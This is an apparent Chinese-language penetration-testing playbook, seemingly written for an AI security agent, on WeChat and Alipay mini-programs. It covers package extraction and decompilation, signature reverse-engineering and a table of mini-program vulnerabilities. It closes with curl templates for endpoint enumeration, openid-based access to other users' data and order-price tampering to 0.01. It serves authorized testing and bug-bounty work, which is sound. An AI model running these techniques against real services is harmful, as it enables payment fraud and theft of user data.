# 微信/支付宝小程序渗透

## Triggers (何时用)

- 目标有微信公众号 / 小程序入口
- scope 含小程序 AppID(`wx` 开头 18 位)
- 抓包看到 `servicewechat.com` / `mpservice` / `weixin.qq.com` 请求
- 客户要求测试小程序安全

## Coverage points (查什么)

**铁律**:
- **小程序后端 = 普通 API** — 抓到包后走 Web 测试全流程(`doctrine/coverage-audit.md`)
- **反编译第一步** — 不要盲扫 API,小程序源码里有完整路由表和签名逻辑
- **openid ≠ 安全标识** — 很多小程序用 openid 做唯一鉴权,可枚举/替换

**包获取**:Android 缓存路径拉 `.wxapkg`(需 root)/ PC 端微信开发者工具提取(无需 root)。
**反编译**:unveilr(推荐,支持最新加密格式)/ wxappUnpacker(旧版备选)。
**敏感信息**:API 地址 / 密钥(appkey/appsecret/aes_key/salt/iv)/ 硬编码凭据 / 路由表(`app.json` 的 `pages`)。
**关键文件**:`app.json`(路由) / `utils/request.js`(baseURL+签名) / `utils/config.js`(API+密钥) / `api/*.js` / `pages/*/index.js`。
**签名/加密逆向**:MD5(sorted_params + secret)/ HMAC-SHA256(timestamp+nonce+body)/ 微信官方签名(getPhoneNumber/支付,不可绕,不花时间)。
**API 安全测试**(主攻):未授权 / 越权(替换 openid/userId/orderId)/ 注入 / 支付逻辑(金额改 0.01/数量负数/优惠券重放)/ 并发(积分兑换/优惠券 20 次)/ 信息泄露(遍历 list 不带过滤)。
**小程序特有漏洞**:webview 任意 URL 加载 / 页面跳转未校验 / 授权信息前端校验 / 分享回调注入 / session_key 泄露 / code 重放。

## Common misses (AI 常忘)

- 盲扫 API 不反编译 → 源码里有完整路由表和签名逻辑,先反编译
- AppID / AppSecret 是微信官方接口调用用的就报漏洞 → 正常配置(但 AppSecret 前端明文 = 可滥用调官方 API,中低危)
- 后端有鉴权,前端没入口就报越权 → 必须实际调用接口返回他人数据才算
- 签名无法绕过就报 → 签名本身不是漏洞,绕过签名后发现的才是
- 公开小程序页面内容(商品列表/活动页)就报泄露 → 设计如此
- 手机号/姓名但是用户自己的 → 读自己数据不算越权
- `wx.login()` 的 code 当 session_key 用 → code 是换 session_key 的凭证,不是鉴权 token

## Verification (verified 标准)

1. **反编译出的 AppID / AppSecret 是微信官方接口调用用的** — 正常配置;但 AppSecret 前端明文可滥用调官方 API,中低危
2. **后端有鉴权,前端没入口** — 不等于越权,必须实际调用接口返回他人数据才算
3. **签名无法绕过** — 不算漏洞,绕过签名后发现的才是
4. **公开小程序页面内容** — 商品列表/活动页本身就是公开的
5. **手机号/姓名但是用户自己的** — 读自己数据不算越权

## Related playbooks

- 签名逆向 → `skills/js-reverse/crypto-sign.md`
- API 越权 → `skills/api-logic/idor-bola.md`
- 支付竞争 → `skills/api-logic/business-logic.md`
- API 枚举 → `skills/api-logic/api-guessing.md`

## Reference (深度参考 — AI 可能不会的细节)

### wxapkg 包获取与反编译

```bash
# Android 缓存路径(需 root / 模拟器)
adb shell "find /data/data/com.tencent.mm/MicroMsg -name '*.wxapkg' 2>/dev/null"
# 通常在: /data/data/com.tencent.mm/MicroMsg/<32位hash>/appbrand/pkg/
adb pull /data/data/com.tencent.mm/MicroMsg/<hash>/appbrand/pkg/_<appid>.wxapkg ./

# 支付宝小程序
adb shell "find /data/data/com.eg.android.AlipayGphone -name '*.zip' -path '*tinyapp*' 2>/dev/null"

# 反编译
npx unveilr <file>.wxapkg -o ./miniapp_src/      # 推荐,支持最新加密格式
node wuWxapkg.js <file>.wxapkg                    # wxappUnpacker,旧版备选
```

**PC 端提取(无需 root)**:微信开发者工具 → 打开小程序 → 源码在 `WeChat Files/Applet/<appid>/`,文件名可能是数字编号需要逐个试。

### 关键文件定位

```
app.json          → 全部页面路由 + tabBar 配置
utils/request.js  → HTTP 请求封装(baseURL + header + 签名)
utils/config.js   → 环境配置(API 地址 / AppID / 密钥)
api/*.js          → 具体 API 调用定义
pages/*/index.js  → 页面逻辑(含 API 调用参数)
```

### 签名模式

```javascript
// 模式 1: MD5(sorted_params + secret)
sign = md5(Object.keys(params).sort().map(k=>k+'='+params[k]).join('&') + '&key=' + SECRET)

// 模式 2: HMAC-SHA256(timestamp + nonce + body)
sign = hmacSha256(SECRET, timestamp + nonce + JSON.stringify(body))

// 模式 3: 微信官方签名(getPhoneNumber / 支付)— 不可绕,不用花时间
```

破解后:自己构造签名 → 任意参数重放 → 等同无签名 API 测试。

### 小程序特有漏洞表

| 漏洞 | 检测方法 | SRC 评级 |
|---|---|---|
| **webview 任意 URL 加载** | 找 `<web-view src="{{url}}">` 且 url 来自参数 | 中(钓鱼 + cookie 窃取) |
| **页面跳转未校验** | `wx.navigateTo({url: 参数})` 可控 → 跳到支付确认页 | 中-高 |
| **授权信息前端校验** | `wx.getUserInfo` 结果不经后端验证 → 伪造用户身份 | 高 |
| **分享回调注入** | 分享 path 含 `../` 或参数拼接 | 低-中 |
| **session_key 泄露** | 后端接口返回 session_key(应只在服务端使用) | 高(可解密手机号) |
| **code 重放** | `wx.login()` 的 code 多次有效 → 会话固定 | 中 |

### PoC 模板

```bash
# 1. 无认证接口枚举
H="https://api.target.com"
for path in /user/info /order/list /address/list /coupon/list /member/detail; do
  echo "=== $path ==="
  curl -sk "$H$path" | head -c 200
  echo ""
done

# 2. openid 越权
MY_OPENID="oXXXX_my_openid"
OTHER_OPENID="oYYYY_other_openid"  # 从列表接口泄露获取
curl -sk "$H/user/info" -H "X-Openid: $OTHER_OPENID" -H "token: $MY_TOKEN"

# 3. 支付金额篡改
curl -sk -X POST "$H/order/create" \
  -H "Content-Type: application/json" \
  -H "token: $MY_TOKEN" \
  -d '{"goods_id":"123","amount":1,"price":0.01}'  # 原价 999 改 0.01
```
